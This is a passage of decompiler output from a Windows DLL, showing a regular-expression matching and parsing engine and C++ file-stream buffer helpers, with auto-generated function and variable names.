  case 0xe:
    FUN_1000f360(piVar6);
    uVar21 = uVar21 + 1;
    goto switchD_100121eb_caseD_9;
  case 0xf:
    piVar6 = (ios_base *)FUN_1000f400();
    uVar21 = uVar21 + 1;
    local_10 = piVar6;
    goto switchD_100121eb_caseD_9;
  case 0x10:
    FUN_1000f360(uVar21 + 1);
    iVar9 = FUN_1000f1a0(uVar21);
    uVar21 = *(uint *)(iVar9 + 4);
    goto switchD_100121eb_caseD_9;
  case 0x11:
    break;
  case 0x14:
    iVar9 = *(int *)(param_3 + 0xc);
    iVar11 = FUN_1000f1a0(uVar21);
    FUN_1000f360(*(undefined4 *)(iVar9 + *(int *)(iVar11 + 4) * 4));
    uVar21 = uVar21 + 1;
    goto switchD_100121eb_caseD_9;
  case 0x15:
    iVar9 = *(int *)(param_3 + 0xc);
    uVar8 = FUN_1000f400();
    iVar11 = FUN_1000f1a0(uVar21);
    uVar21 = uVar21 + 1;
    *(undefined4 *)(iVar9 + *(int *)(iVar11 + 4) * 4) = uVar8;
    piVar6 = local_10;
    goto switchD_100121eb_caseD_9;
  case 0x16:
    iVar9 = *(int *)(param_3 + 0xc);
    iVar11 = FUN_1000f1a0(uVar21);
    uVar21 = uVar21 + 1;
    *(ios_base **)(iVar9 + *(int *)(iVar11 + 4) * 4) = piVar6;
    goto switchD_100121eb_caseD_9;
  case 0x17:
    iVar9 = *(int *)(param_3 + 0xc);
    iVar11 = FUN_1000f1a0(uVar21);
    uVar21 = uVar21 + 1;
    *(undefined4 *)(iVar9 + *(int *)(iVar11 + 4) * 4) = *(undefined4 *)(param_3 + 0x24);
    goto switchD_100121eb_caseD_9;
  case 0x18:
    iVar9 = *(int *)(param_3 + 0xc);
    iVar11 = FUN_1000f1a0(uVar21);
    uVar21 = uVar21 + 1;
    piVar6 = *(ios_base **)(iVar9 + *(int *)(iVar11 + 4) * 4);
    local_10 = piVar6;
    goto switchD_100121eb_caseD_9;
  case 0x19:
    iVar9 = *(int *)(param_3 + 0xc);
    iVar11 = FUN_1000f1a0(uVar21);
    uVar21 = uVar21 + 1;
    *(undefined4 *)(param_3 + 0x24) = *(undefined4 *)(iVar9 + *(int *)(iVar11 + 4) * 4);
    goto switchD_100121eb_caseD_9;
  case 0x1a:
    iVar9 = *(int *)(param_3 + 0xc);
    iVar11 = FUN_1000f1a0(uVar21);
    if (piVar6 == *(ios_base **)(iVar9 + *(int *)(iVar11 + 4) * 4)) {
      uVar21 = FUN_1000f400();
    }
    else {
LAB_10012234:
      uVar21 = uVar21 + 1;
    }
    goto switchD_100121eb_caseD_9;
  case 0x1b:
    uVar22 = *(uint *)(param_3 + 0x10);
    in_stack_ffffffe4 = uVar22;
    if (*(int *)(param_1 + 0x1c) == 0) {
      iVar9 = FUN_1000f1a0(uVar21);
      iVar9 = *(int *)(iVar9 + 4);
      iVar11 = FUN_1000f1a0(uVar21);
      iVar11 = *(int *)(uVar22 + 4 + *(int *)(iVar11 + 4) * 8);
      iVar9 = *(int *)(uVar22 + iVar9 * 8);
      iVar10 = FUN_1000f1a0(uVar21);
      iVar9 = __strnicmp((char *)local_10,*(char **)(in_stack_ffffffe4 + *(int *)(iVar10 + 4) * 8),
                         iVar11 - iVar9);
    }
    else {
      iVar9 = FUN_1000f1a0(uVar21);
      iVar9 = *(int *)(iVar9 + 4);
      iVar11 = FUN_1000f1a0(uVar21);
      iVar11 = *(int *)(uVar22 + 4 + *(int *)(iVar11 + 4) * 8);
      iVar9 = *(int *)(uVar22 + iVar9 * 8);
      iVar10 = FUN_1000f1a0(uVar21);
      iVar9 = _strncmp((char *)local_10,*(char **)(in_stack_ffffffe4 + *(int *)(iVar10 + 4) * 8),
                       iVar11 - iVar9);
    }
    piVar6 = local_10;
    if (iVar9 == 0) {
      iVar9 = *(int *)(param_3 + 0x10);
      iVar11 = FUN_1000f1a0(uVar21);
      iVar11 = *(int *)(iVar11 + 4);
      iVar10 = FUN_1000f1a0(uVar21);
      piVar6 = local_10 +
               (*(int *)(iVar9 + 4 + *(int *)(iVar10 + 4) * 8) - *(int *)(iVar9 + iVar11 * 8));
      uVar21 = uVar21 + 1;
      local_10 = piVar6;
    }
    else {
LAB_10012403:
      uVar21 = FUN_1000f400();
    }
    goto switchD_100121eb_caseD_9;
  case 0x1c:
    goto switchD_100121eb_caseD_1c;
  case 0x1d:
    piVar6 = piVar16 + 1;
    if (*piVar6 == (ios_base)0x0) goto switchD_100121eb_caseD_1c;
    uVar21 = 0;
    *(undefined4 *)(param_3 + 0x24) = 0;
    piVar16 = piVar6;
    local_10 = piVar6;
    goto switchD_100121eb_caseD_9;
  case 0x1e:
    *(ios_base **)(param_3 + 8) = piVar6;
    if (*(int *)(param_1 + 0x1c) == 0) {
      FUN_10012eb0(param_3,param_2,piVar24);
    }
    if (param_4 != (undefined4 *)0x0) {
      *param_4 = param_2 + ((int)piVar6 - (int)piVar24);
    }
    if (piVar24 != param_2) {
      FUN_100579ee(piVar24);
    }
    return (ios_base *)0x1;
  case 0x1f:
    iVar9 = *(int *)(param_3 + 0x10);
    iVar11 = FUN_1000f1a0(uVar21);
    FUN_1000f360(*(undefined4 *)(iVar9 + *(int *)(iVar11 + 4) * 8));
    iVar9 = *(int *)(param_3 + 0x10);
    iVar11 = FUN_1000f1a0(uVar21);
    FUN_1000f360(*(undefined4 *)(iVar9 + 4 + *(int *)(iVar11 + 4) * 8));
    uVar21 = uVar21 + 1;
    goto switchD_100121eb_caseD_9;
  case 0x20:
    iVar9 = *(int *)(param_3 + 0x10);
    uVar8 = FUN_1000f400();
    iVar11 = FUN_1000f1a0(uVar21);
    *(undefined4 *)(iVar9 + 4 + *(int *)(iVar11 + 4) * 8) = uVar8;
    iVar9 = *(int *)(param_3 + 0x10);
    uVar8 = FUN_1000f400();
    iVar11 = FUN_1000f1a0(uVar21);
    uVar21 = uVar21 + 1;
    *(undefined4 *)(iVar9 + *(int *)(iVar11 + 4) * 8) = uVar8;
    piVar6 = local_10;
    goto switchD_100121eb_caseD_9;
  }
  uVar21 = FUN_1000f400();
  goto switchD_100121eb_caseD_9;
switchD_100121eb_caseD_1c:
  *(ios_base **)(param_3 + 8) = piVar6;
  if (*(int *)(param_1 + 0x1c) == 0) {
    FUN_10012eb0(param_3,param_2,piVar24);
  }
  if (param_4 != (undefined4 *)0x0) {
    *param_4 = param_2 + ((int)piVar6 - (int)piVar24);
  }
  if (piVar24 == param_2) {
    return (ios_base *)0x0;
  }
  FUN_100579ee(piVar24);
  return (ios_base *)0x0;
}



/* Function: FUN_10012840 */

undefined4 __thiscall FUN_10012840(undefined4 param_1,byte param_2)

{
  FUN_100117e0();
  if ((param_2 & 1) != 0) {
    thunk_FUN_100579ee(param_1);
  }
  return param_1;
}



/* Function: FUN_10012870 */

int * __thiscall FUN_10012870(int *param_1,uint param_2,undefined4 param_3)

{
  uint uVar1;
  int iVar2;
  code *pcVar3;
  int *piVar4;
  
  iVar2 = param_1[4];
  if (-iVar2 - 1U <= param_2) {
    FUN_10056a6a("string too long");
LAB_1001290c:
    FUN_10056a6a("string too long");
    pcVar3 = (code *)swi(3);
    piVar4 = (int *)(*pcVar3)();
    return piVar4;
  }
  if (param_2 != 0) {
    uVar1 = iVar2 + param_2;
    if (uVar1 == 0xffffffff) goto LAB_1001290c;
    if ((uint)param_1[5] < uVar1) {
      FUN_1000bb20(uVar1,iVar2);
      if (uVar1 == 0) {
        return param_1;
      }
    }
    else if (uVar1 == 0) {
      param_1[4] = 0;
      if (0xf < (uint)param_1[5]) {
        *(undefined1 *)*param_1 = 0;
        return param_1;
      }
      *(undefined1 *)param_1 = 0;
      return param_1;
    }
    FUN_1000bad0(param_1[4],param_2,param_3);
    param_1[4] = uVar1;
    if (0xf < (uint)param_1[5]) {
      *(undefined1 *)(*param_1 + uVar1) = 0;
      return param_1;
    }
    *(undefined1 *)((int)param_1 + uVar1) = 0;
  }
  return param_1;
}



/* Function: FUN_10012920 */

int __thiscall FUN_10012920(int *param_1,char *param_2,int param_3,uint param_4)

{
  char cVar1;
  int iVar2;
  char *pcVar3;
  
  if ((*param_1 != 0) && (param_4 < *(uint *)(*param_1 + 8))) {
    if (param_3 == -1) {
      if (param_2 == (char *)0x0) {
        param_3 = 0;
      }
      else {
        pcVar3 = param_2;
        do {
          cVar1 = *pcVar3;
          pcVar3 = pcVar3 + 1;
        } while (cVar1 != '\0');
        param_3 = (int)pcVar3 - (int)(param_2 + 1);
      }
    }
    iVar2 = FUN_1004b540(param_2,param_3);
    if (iVar2 != -1) {
      return iVar2 + param_4;
    }
  }
  return -1;
}



/* Function: FUN_100129a0 */

int __thiscall FUN_100129a0(int param_1,int *param_2)

{
  int iVar1;
  undefined4 uVar2;
  undefined4 *puVar3;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10074b18;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  if (*(int *)(param_1 + 0x50) == 0) {
    iVar1 = FUN_1005732f(param_2,0x21,0x40,DAT_100956e0 ^ (uint)&stack0xfffffffc);
    if (iVar1 != 0) {
      FUN_10012b10(iVar1,1);
      uVar2 = FUN_10013020(&param_2);
      local_8 = 0;
      uVar2 = FUN_10014470(uVar2);
      FUN_10012d30(uVar2);
      local_8 = 0xffffffff;
      if (param_2 != (int *)0x0) {
        puVar3 = (undefined4 *)(**(code **)(*param_2 + 8))();
        if (puVar3 != (undefined4 *)0x0) {
          (**(code **)*puVar3)(1);
        }
      }
      ExceptionList = local_10;
      return param_1;
    }
  }
  ExceptionList = local_10;
  return 0;
}



/* Function: FUN_10012a60 */

int __fastcall FUN_10012a60(int param_1)

{
  undefined4 uVar1;
  char cVar2;
  int iVar3;
  int iVar4;
  
  if (*(int *)(param_1 + 0x50) == 0) {
    iVar4 = 0;
  }
  else {
    cVar2 = FUN_10012bb0();
    iVar4 = param_1;
    if (cVar2 == '\0') {
      iVar4 = 0;
    }
    iVar3 = _fclose(*(FILE **)(param_1 + 0x50));
    if (iVar3 != 0) {
      iVar4 = 0;
    }
  }
  *(undefined1 *)(param_1 + 0x4c) = 0;
  *(int *)(param_1 + 0xc) = param_1 + 4;
  *(undefined4 **)(param_1 + 0x10) = (undefined4 *)(param_1 + 8);
  *(int *)(param_1 + 0x1c) = param_1 + 0x14;
  *(int *)(param_1 + 0x20) = param_1 + 0x18;
  *(int *)(param_1 + 0x2c) = param_1 + 0x24;
  *(int *)(param_1 + 0x30) = param_1 + 0x28;
  *(undefined1 *)(param_1 + 0x45) = 0;
  *(undefined4 *)(param_1 + 8) = 0;
  **(undefined4 **)(param_1 + 0x20) = 0;
  **(undefined4 **)(param_1 + 0x30) = 0;
  **(undefined4 **)(param_1 + 0xc) = 0;
  **(undefined4 **)(param_1 + 0x1c) = 0;
  **(undefined4 **)(param_1 + 0x2c) = 0;
  uVar1 = DAT_1009aca4;
  *(undefined4 *)(param_1 + 0x50) = 0;
  *(undefined4 *)(param_1 + 0x48) = uVar1;
  *(undefined4 *)(param_1 + 0x40) = 0;
  return iVar4;
}



/* Function: FUN_10012b10 */

void __thiscall FUN_10012b10(int param_1,int param_2,int param_3)

{
  undefined4 uVar1;
  
  *(undefined4 **)(param_1 + 0x10) = (undefined4 *)(param_1 + 8);
  *(undefined1 *)(param_1 + 0x45) = 0;
  *(bool *)(param_1 + 0x4c) = param_3 == 1;
  *(int *)(param_1 + 0xc) = param_1 + 4;
  *(int *)(param_1 + 0x1c) = param_1 + 0x14;
  *(int *)(param_1 + 0x20) = param_1 + 0x18;
  *(int *)(param_1 + 0x2c) = param_1 + 0x24;
  *(int *)(param_1 + 0x30) = param_1 + 0x28;
  *(undefined4 *)(param_1 + 8) = 0;
  **(undefined4 **)(param_1 + 0x20) = 0;
  **(undefined4 **)(param_1 + 0x30) = 0;
  **(undefined4 **)(param_1 + 0xc) = 0;
  **(undefined4 **)(param_1 + 0x1c) = 0;
  **(undefined4 **)(param_1 + 0x2c) = 0;
  if (param_2 != 0) {
    *(int *)(param_1 + 0x1c) = param_2;
    *(int *)(param_1 + 0xc) = param_2 + 8;
    *(int *)(param_1 + 0x10) = param_2 + 8;
    *(int *)(param_1 + 0x20) = param_2;
    *(int *)(param_1 + 0x2c) = param_2 + 4;
    *(int *)(param_1 + 0x30) = param_2 + 4;
  }
  uVar1 = DAT_1009aca4;
  *(int *)(param_1 + 0x50) = param_2;
  *(undefined4 *)(param_1 + 0x48) = uVar1;
  *(undefined4 *)(param_1 + 0x40) = 0;
  return;
}



/* Function: FUN_10012bb0 */

/* WARNING: Removing unreachable block (ram,0x10012c36) */

void __fastcall FUN_10012bb0(int *param_1)

{
  int iVar1;
  undefined8 *puVar2;
  int iVar3;
  undefined8 *puVar4;
  undefined1 auStack_3c [4];
  int iStack_38;
  undefined8 uStack_34;
  undefined1 uStack_2c;
  int iStack_24;
  uint uStack_20;
  uint local_1c;
  void *local_14;
  undefined1 *puStack_10;
  undefined4 uStack_c;
  
  uStack_c = 0xffffffff;
  puStack_10 = &LAB_10074b48;
  local_14 = ExceptionList;
  local_1c = DAT_100956e0 ^ (uint)auStack_3c;
  ExceptionList = &local_14;
  if (((param_1[0x10] != 0) && (*(char *)((int)param_1 + 0x45) != '\0')) &&
     (iVar1 = (**(code **)(*param_1 + 0xc))(0xffffffff,DAT_100956e0 ^ (uint)&stack0xffffffb8),
     iVar1 != -1)) {
    uStack_20 = 0xf;
    uStack_34 = 0;
    iStack_24 = 8;
    uStack_2c = 0;
    uStack_c = 0;
LAB_10012c50:
    puVar2 = &uStack_34;
    if (0xf < uStack_20) {
      puVar2 = (undefined8 *)uStack_34;
    }
    puVar4 = &uStack_34;
    if (0xf < uStack_20) {
      puVar4 = (undefined8 *)uStack_34;
    }
    iVar1 = (**(code **)(*(int *)param_1[0x10] + 0x20))
                      (param_1 + 0x12,puVar4,iStack_24 + (int)puVar2,&iStack_38);
    if (iVar1 == 0) {
      *(undefined1 *)((int)param_1 + 0x45) = 0;
    }
    else if (iVar1 != 1) goto LAB_10012ced;
    puVar2 = &uStack_34;
    if (0xf < uStack_20) {
      puVar2 = (undefined8 *)uStack_34;
    }
    iVar1 = iStack_38 - (int)puVar2;
    if (iVar1 != 0) {
      puVar2 = &uStack_34;
      if (0xf < uStack_20) {
        puVar2 = (undefined8 *)uStack_34;
      }
      iVar3 = FUN_10059d85(puVar2,1,iVar1,param_1[0x14]);
      if (iVar1 != iVar3) goto LAB_10012ced;
    }
    if (*(char *)((int)param_1 + 0x45) == '\0') goto LAB_10012ced;
    if (iVar1 == 0) {
      FUN_10012870(8,0);
    }
    goto LAB_10012c50;
  }
LAB_10012d06:
  ExceptionList = local_14;
  FUN_100579df();
  return;
LAB_10012ced:
  if (0xf < uStack_20) {
    thunk_FUN_100579ee((undefined8 *)uStack_34);
  }
  goto LAB_10012d06;
}



/* Function: FUN_10012d30 */

void __thiscall FUN_10012d30(int param_1,int *param_2)

{
  char cVar1;
  
  cVar1 = (**(code **)(*param_2 + 0xc))();
  if (cVar1 != '\0') {
    *(undefined4 *)(param_1 + 0x40) = 0;
    return;
  }
  *(int **)(param_1 + 0x40) = param_2;
  *(int *)(param_1 + 0xc) = param_1 + 4;
  *(undefined4 **)(param_1 + 0x10) = (undefined4 *)(param_1 + 8);
  *(int *)(param_1 + 0x1c) = param_1 + 0x14;
  *(int *)(param_1 + 0x20) = param_1 + 0x18;
  *(int *)(param_1 + 0x2c) = param_1 + 0x24;
  *(int *)(param_1 + 0x30) = param_1 + 0x28;
  *(undefined4 *)(param_1 + 8) = 0;
  **(undefined4 **)(param_1 + 0x20) = 0;
  **(undefined4 **)(param_1 + 0x30) = 0;
  **(undefined4 **)(param_1 + 0xc) = 0;
  **(undefined4 **)(param_1 + 0x1c) = 0;
  **(undefined4 **)(param_1 + 0x2c) = 0;
  return;
}



/* Function: _Reset_back */

/* Library Function - Single Match
    private: void __thiscall std::basic_filebuf<char,struct std::char_traits<char>
   >::_Reset_back(void)
   
   Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release */

void __thiscall
std::basic_filebuf<char,struct_std::char_traits<char>_>::_Reset_back
          (basic_filebuf<char,struct_std::char_traits<char>_> *this)

{
  int iVar1;
  int iVar2;
  
  if ((basic_filebuf<char,struct_std::char_traits<char>_> *)**(int **)(this + 0xc) == this + 0x44) {
    iVar1 = *(int *)(this + 0x38);
    iVar2 = *(int *)(this + 0x3c);
    **(int **)(this + 0xc) = iVar1;
    **(int **)(this + 0x1c) = iVar1;
    **(int **)(this + 0x2c) = iVar2 - iVar1;
  }
  return;
}



/* Function: _Set_back */

/* Library Function - Single Match
    private: void __thiscall std::basic_filebuf<char,struct std::char_traits<char>
   >::_Set_back(void)
   
   Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release */

void __thiscall
std::basic_filebuf<char,struct_std::char_traits<char>_>::_Set_back
          (basic_filebuf<char,struct_std::char_traits<char>_> *this)

{
  basic_filebuf<char,struct_std::char_traits<char>_> *pbVar1;
  basic_filebuf<char,struct_std::char_traits<char>_> *pbVar2;
  
  pbVar1 = this + 0x44;
  pbVar2 = (basic_filebuf<char,struct_std::char_traits<char>_> *)**(int **)(this + 0xc);
  if (pbVar2 != pbVar1) {
    *(basic_filebuf<char,struct_std::char_traits<char>_> **)(this + 0x38) = pbVar2;
    *(int *)(this + 0x3c) = **(int **)(this + 0x2c) + **(int **)(this + 0x1c);
  }
  **(int **)(this + 0xc) = (int)pbVar1;
  **(int **)(this + 0x1c) = (int)pbVar1;
  **(undefined4 **)(this + 0x2c) = this + (0x45 - (int)pbVar1);
  return;
}



/* Function: FUN_10012e30 */

int __thiscall FUN_10012e30(int *param_1,undefined4 *param_2,char *param_3)

{
  undefined4 *puVar1;
  char *pcVar2;
  int iVar3;
  
  pcVar2 = param_3;
  puVar1 = param_2;
  if (*(char *)*param_2 == '\0') {
    return -1;
  }
  iVar3 = FUN_10013040(param_2,param_3);
  if (-1 < iVar3) {
    param_2._3_1_ = '\x01';
    FUN_10012e30(puVar1,(int)&param_2 + 3);
    if (*param_1 != 0) {
      return -1;
    }
    if ((*pcVar2 != '\0') && (param_2._3_1_ != '\0')) {
      *pcVar2 = '\x01';
      return iVar3;
    }
    *pcVar2 = '\0';
  }
  return iVar3;
}



/* Function: FUN_10012eb0 */

void FUN_10012eb0(uint *param_1,int param_2,int param_3)

{
  int *piVar1;
  code *pcVar2;
  uint uVar3;
  
  if (param_1 != (uint *)0x0) {
    param_1[1] = param_1[1] + (param_2 - param_3);
    param_1[2] = param_1[2] + (param_2 - param_3);
    uVar3 = 0;
    if (*param_1 != 0) {
      do {
        piVar1 = (int *)(param_1[4] + uVar3 * 8);
        if ((*piVar1 != 0) && (piVar1[1] != 0)) {
          *piVar1 = (*piVar1 - param_3) + param_2;
          piVar1 = (int *)(param_1[4] + uVar3 * 8 + 4);
          *piVar1 = *piVar1 + (param_2 - param_3);
        }
        uVar3 = uVar3 + 1;
      } while (uVar3 < *param_1);
    }
    return;
  }
  FUN_10007f20(0x80004005);
  pcVar2 = (code *)swi(3);
  (*pcVar2)();
  return;
}



/* Function: FUN_10012f20 */

undefined1 FUN_10012f20(void)

{
  return 1;
}



/* Function: FUN_10012f30 */

undefined4
FUN_10012f30(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 *param_4,
            undefined4 param_5,undefined4 param_6,undefined4 *param_7)

{
  *param_4 = param_2;
  *param_7 = param_5;
  return 3;
}



/* Function: FUN_10012f50 */

undefined4
FUN_10012f50(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 *param_4)

{
  *param_4 = param_2;
  return 0;
}



/* Function: FUN_10012f70 */

uint FUN_10012f70(undefined4 param_1,int param_2,int param_3,uint param_4)

{
  uint uVar1;
  
  uVar1 = param_3 - param_2;
  if (param_4 < (uint)(param_3 - param_2)) {
    uVar1 = param_4;
  }
  return uVar1;
}



/* Function: FUN_10012f90 */

undefined4 * __fastcall FUN_10012f90(undefined4 *param_1)

{
  undefined4 *puVar1;
  undefined4 uVar2;
  
  *param_1 = std::basic_streambuf<char,struct_std::char_traits<char>_>::vftable;
  puVar1 = (undefined4 *)FUN_100582fa(4);
  if (puVar1 == (undefined4 *)0x0) {
    puVar1 = (undefined4 *)0x0;
  }
  else {
    uVar2 = FUN_10056cb5(1);
    *puVar1 = uVar2;
  }
  param_1[0xd] = puVar1;
  param_1[3] = param_1 + 1;
  param_1[4] = param_1 + 2;
  param_1[7] = param_1 + 5;
  param_1[8] = param_1 + 6;
  param_1[0xb] = param_1 + 9;
  param_1[0xc] = param_1 + 10;
  param_1[2] = 0;
  *(undefined4 *)param_1[8] = 0;
  *(undefined4 *)param_1[0xc] = 0;
  *(undefined4 *)param_1[3] = 0;
  *(undefined4 *)param_1[7] = 0;
  *(undefined4 *)param_1[0xb] = 0;
  return param_1;
}



/* Function: FUN_10013020 */

undefined4 * __thiscall FUN_10013020(int param_1,undefined4 *param_2)

{
  int *piVar1;
  
  piVar1 = (int *)**(undefined4 **)(param_1 + 0x34);
  *param_2 = piVar1;
  (**(code **)(*piVar1 + 4))();
  return param_2;
}



/* Function: FUN_10013040 */

int __thiscall FUN_10013040(int *param_1,undefined4 *param_2,byte *param_3)

{
  undefined4 uVar1;
  code *pcVar2;
  undefined4 *puVar3;
  int iVar4;
  uint uVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  
  puVar3 = param_2;
  uVar1 = *param_2;
  iVar4 = FUN_1000f110(0xe);
  if (-1 < iVar4) {
    uVar5 = FUN_1000f110(0x10);
    if (-1 < (int)uVar5) {
      if ((uint)param_1[2] <= uVar5) {
        FUN_10007f20(0x80070057);
        pcVar2 = (code *)swi(3);
        iVar4 = (*pcVar2)();
        return iVar4;
      }
      *(int *)(param_1[1] + 4 + uVar5 * 8) = iVar4 + 4;
      iVar6 = FUN_1000f110(0xf);
      if (-1 < iVar6) {
        iVar6 = FUN_1000f110(0xd);
        if (-1 < iVar6) {
          iVar7 = FUN_100131b0(puVar3,param_3);
          if (iVar7 < 0) {
            if (*param_1 == 0) {
              FUN_1000f990(param_1);
              return iVar7;
            }
          }
          else {
            iVar7 = FUN_1000f110(0xd);
            if (-1 < iVar7) {
              iVar8 = FUN_1000f1a0(iVar6);
              *(int *)(iVar8 + 4) = iVar7 + 1;
              if (*(char *)*puVar3 != '|') {
                FUN_1000f990(param_1);
                *puVar3 = uVar1;
                iVar4 = FUN_100131b0(puVar3,param_3);
                return iVar4;
              }
              *puVar3 = (char *)*puVar3 + 1;
              iVar9 = FUN_10013040(puVar3,(int)&param_2 + 3);
              iVar8 = param_1[2];
              iVar7 = FUN_1000f1a0(iVar7);
              *(int *)(iVar7 + 4) = iVar8;
              iVar6 = FUN_1000f1a0(iVar6);
              *(int *)(iVar6 + 4) = iVar9;
              if (-1 < iVar9) {
                *param_3 = *param_3 | param_2._3_1_;
                return iVar4;
              }
              if (*param_1 == 0) {
                FUN_1000f990(param_1);
                return iVar9;
              }
            }
          }
        }
      }
    }
  }
  return -1;
}



/* Function: FUN_100131b0 */

int __thiscall FUN_100131b0(undefined4 *param_1,int *param_2,char *param_3)

{
  char cVar1;
  undefined4 uVar2;
  char *pcVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  int iVar10;
  int iVar11;
  
  uVar2 = param_1[5];
  iVar5 = *param_2;
  iVar4 = FUN_10013520(param_2,param_3);
  if (iVar4 < 0) {
    return iVar4;
  }
  pcVar3 = (char *)*param_2;
  cVar1 = *pcVar3;
  if (cVar1 == '*') {
    *param_2 = (int)(pcVar3 + 1);
    if (pcVar3[1] == '?') {
      iVar11 = 0x13;
      *param_2 = (int)(pcVar3 + 2);
    }
    else {
      iVar11 = 0x12;
    }
LAB_10013259:
    FUN_1000f990(param_1);
  }
  else {
    if (cVar1 != '+') {
      if (cVar1 != '?') {
        return iVar4;
      }
      *param_2 = (int)(pcVar3 + 1);
      if (pcVar3[1] == '?') {
        iVar11 = 0xc;
        *param_2 = (int)(pcVar3 + 2);
      }
      else {
        iVar11 = 0xb;
      }
      goto LAB_10013259;
    }
    *param_2 = (int)(pcVar3 + 1);
    if (pcVar3[1] == '?') {
      iVar11 = 10;
      *param_2 = (int)(pcVar3 + 2);
      param_1[5] = uVar2;
    }
    else {
      iVar11 = 9;
      param_1[5] = uVar2;
    }
  }
  *param_2 = iVar5;
  if (((iVar11 == 0x13) || (iVar11 == 10)) || (iVar11 == 0xc)) {
    iVar5 = FUN_1000f110(0x10);
    if (iVar5 < 0) {
      return -1;
    }
    *param_3 = '\0';
    iVar6 = FUN_10013520(param_2,param_3);
    if (iVar6 < 0) {
      return iVar6;
    }
    if ((*param_3 == '\0') || ((iVar11 != 0x13 && (iVar11 != 10)))) {
      *param_2 = *param_2 + 2;
      *param_3 = '\x01';
      if ((iVar11 != 0x13) && (iVar11 != 10)) {
        iVar7 = FUN_1000f1a0(iVar5);
        *(int *)(iVar7 + 4) = iVar6 + 1;
        if (iVar11 == 10) {
          iVar5 = iVar4;
        }
        return iVar5;
      }
      iVar6 = FUN_1000f110(0xd);
      if (iVar6 < 0) {
        return -1;
      }
      iVar7 = FUN_1000f1a0(iVar5);
      *(int *)(iVar7 + 4) = iVar6 + 1;
      iVar6 = FUN_1000f1a0(iVar6);
      *(int *)(iVar6 + 4) = iVar5;
      if (iVar11 == 10) {
        iVar5 = iVar4;
      }
      return iVar5;
    }
LAB_1001338f:
    *param_1 = 9;
    return -1;
  }
  iVar5 = FUN_1000f110(0x14);
  if (iVar5 < 0) {
    return -1;
  }
  iVar6 = FUN_1000f110(0x16);
  if (iVar6 < 0) {
    return -1;
  }
  iVar7 = FUN_1000f110(0xe);
  if (iVar7 < 0) {
    return -1;
  }
  iVar7 = FUN_1000f110(0x10);
  if (iVar7 < 0) {
    return -1;
  }
  iVar8 = FUN_1000f110(0xf);
  if (iVar8 < 0) {
    return -1;
  }
  iVar8 = FUN_1000f110(0x15);
  if (iVar8 < 0) {
    return -1;
  }
  iVar9 = FUN_1000f110(0xd);
  if (iVar9 < 0) {
    return -1;
  }
  iVar10 = FUN_1000f1a0(iVar5);
  *(undefined4 *)(iVar10 + 4) = param_1[6];
  param_1[6] = param_1[6] + 1;
  iVar10 = FUN_1000f1a0(iVar5);
  iVar6 = FUN_1000f1a0(iVar6);
  *(undefined4 *)(iVar6 + 4) = *(undefined4 *)(iVar10 + 4);
  iVar6 = FUN_1000f1a0(iVar7);
  *(int *)(iVar6 + 4) = iVar9 + 1;
  iVar6 = FUN_1000f1a0(iVar5);
  iVar7 = FUN_1000f1a0(iVar8);
  *(undefined4 *)(iVar7 + 4) = *(undefined4 *)(iVar6 + 4);
  *param_3 = '\0';
  iVar6 = FUN_10013520(param_2,param_3);
  if (iVar6 < 0) {
    return iVar6;
  }
  if (*param_3 == '\0') {
    if (iVar11 == 9) goto LAB_100133a9;
  }
  else if ((iVar11 == 0x12) || (iVar11 == 9)) goto LAB_1001338f;
  *param_3 = '\x01';
LAB_100133a9:
  *param_2 = *param_2 + 1;
  iVar6 = FUN_1000f110(0x1a);
  if ((-1 < iVar6) && (iVar7 = FUN_1000f110(0x16), -1 < iVar7)) {
    iVar8 = FUN_1000f1a0(iVar5);
    iVar6 = FUN_1000f1a0(iVar6);
    *(undefined4 *)(iVar6 + 4) = *(undefined4 *)(iVar8 + 4);
    iVar6 = FUN_1000f1a0(iVar5);
    iVar7 = FUN_1000f1a0(iVar7);
    *(undefined4 *)(iVar7 + 4) = *(undefined4 *)(iVar6 + 4);
    if (iVar11 != 0xb) {
      iVar6 = FUN_1000f110(0xd);
      if (iVar6 < 0) {
        return -1;
      }
      iVar6 = FUN_1000f1a0(iVar6);
      *(int *)(iVar6 + 4) = iVar5;
    }
    uVar2 = param_1[2];
    iVar6 = FUN_1000f1a0(iVar9);
    *(undefined4 *)(iVar6 + 4) = uVar2;
    if (iVar11 == 9) {
      iVar5 = iVar4;
    }
    return iVar5;
  }
  return -1;
}



/* Function: FUN_10013520 */

int __thiscall FUN_10013520(int *param_1,int *param_2,undefined1 *param_3)

{
  char cVar1;
  char *pcVar2;
  int iVar3;
  int iVar4;
  uint uVar5;
  
  pcVar2 = (char *)*param_2;
  cVar1 = *pcVar2;
  if (cVar1 == '{') {
    *param_2 = (int)(pcVar2 + 1);
    iVar3 = FUN_100136f0(param_2,param_3);
    return iVar3;
  }
  if (cVar1 == '(') {
    *param_2 = (int)(pcVar2 + 1);
    iVar3 = FUN_10013870(param_2,param_3);
    return iVar3;
  }
  if (cVar1 == '[') {
    *param_2 = (int)(pcVar2 + 1);
    iVar3 = FUN_10013910(param_2,param_3);
    return iVar3;
  }
  if (cVar1 == '\\') {
    *param_2 = (int)(pcVar2 + 1);
    iVar3 = _isdigit((uint)(byte)pcVar2[1]);
    if (iVar3 == 0) {
      iVar3 = FUN_10013b60(param_2,param_3);
      if (-1 < iVar3) {
        return iVar3;
      }
      if ((*param_1 == 0) && (iVar3 = FUN_1000f110(3), -1 < iVar3)) {
        cVar1 = *(char *)*param_2;
        iVar4 = FUN_1000f1a0(iVar3);
        *(int *)(iVar4 + 4) = (int)cVar1;
        *param_2 = *param_2 + 1;
        return iVar3;
      }
    }
    else {
      *param_3 = 0;
      iVar3 = FUN_1000f110(0x1b);
      if (-1 < iVar3) {
        uVar5 = FUN_1005935e(*param_2,param_2,10);
        if (uVar5 < (uint)param_1[5]) {
          iVar4 = FUN_1000f1a0(iVar3);
          *(uint *)(iVar4 + 4) = uVar5;
          return iVar3;
        }
        *param_1 = 7;
      }
    }
  }
  else {
    if (cVar1 == '!') {
      *param_2 = (int)(pcVar2 + 1);
